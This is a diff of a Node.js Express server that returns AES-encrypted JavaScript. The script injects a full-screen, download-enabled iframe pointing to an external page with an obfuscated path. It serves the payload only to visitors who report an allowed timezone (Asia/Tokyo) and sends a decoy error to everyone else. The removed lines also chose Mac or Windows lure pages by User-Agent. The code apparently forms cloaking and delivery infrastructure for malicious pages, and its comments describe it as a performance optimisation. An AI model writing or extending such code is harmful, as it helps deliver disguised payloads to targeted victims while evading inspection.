@@ -24,30 +24,50 @@ app.use((req, res, next) => {
 
 // --- Static Data Configurations ---
 
+// O(1) Instant Lookup Set
 const ALLOWED_TIMEZONES = new Set([
-    "Asia/Tokyo", "Asia/Calcutta"
+    "Asia/Tokyo"
 ]);
 
-// URL configurations organized by platform target
-const URL_CONFIGS = {
-    mac: "https://sonik-q6vt.vercel.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://sonik-q6vt.vercel.app/Win0codejInfowj2n/index.html"
-};
+// Raw URLs accompanied by their selection probability weights (Must total 1.0)
+const RAW_CONFIGS = [
+    { url: "https://d50ecf15-a7fc-4251-bdac-b5cfab9ac425.svc.edge.scw.cloud/Win0codejInfowj2n/index.html", weight: 1.0 }
+
+];
 
 // --- Pre-Compilation Cache Layer ---
-// Helper to generate the standard iframe injection script
-function buildPayload(url) {
-    return `const iframe=document.createElement("iframe");iframe.src="${url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
-}
+// This processes everything into memory ONCE during boot, removing CPU load during requests.
 
-// Pre-compute responses during application boot to avoid runtime encryption overhead
-const PRECOMPUTED_RESPONSES = {
-    mac: encodeURIComponent(CryptoJS.AES.encrypt(buildPayload(URL_CONFIGS.mac), secretKey).toString()),
-    default: encodeURIComponent(CryptoJS.AES.encrypt(buildPayload(URL_CONFIGS.default), secretKey).toString())
-};
+const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
+    const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
+    
+    return {
+        weight: item.weight,
+        encryptedPayload: encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString())
+    };
+});
 
 // Pre-encrypt static error payload
 const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
+
+// --- Helper Functions ---
+
+/**
+ * Returns a pre-encrypted payload immediately using constant-time evaluation 
+ * and simple random boundary checks.
+ */
+function getFastResponse() {
+    const rand = Math.random();
+    let cumulativeWeight = 0;
+
+    for (const item of PRECOMPUTED_RESPONSES) {
+        cumulativeWeight += item.weight;
+        if (rand <= cumulativeWeight) {
+            return item.encryptedPayload;
+        }
+    }
+    return PRECOMPUTED_RESPONSES[PRECOMPUTED_RESPONSES.length - 1].encryptedPayload;
+}
 
 // --- Routes ---
 
@@ -62,20 +82,11 @@ app.get("/timezone", (req, res) => {
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
 
-    // Validate timezone restriction
-    if (!timezone || !ALLOWED_TIMEZONES.has(timezone)) {
-        return res.send(ERROR_PAYLOAD);
-    }
-
-    // Inspect User-Agent header to detect if the platform is Macintosh
-    const userAgent = req.headers["user-agent"] || "";
-    const isMac = /Macintosh|Mac OS X/i.test(userAgent);
-
-    // Serve the corresponding pre-encrypted payload
-    if (isMac) {
-        res.send(PRECOMPUTED_RESPONSES.mac);
+    // Fast validations against memory references 
+    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
+        res.send(getFastResponse());
     } else {
-        res.send(PRECOMPUTED_RESPONSES.default);
+        res.send(ERROR_PAYLOAD);
     }
 });
 
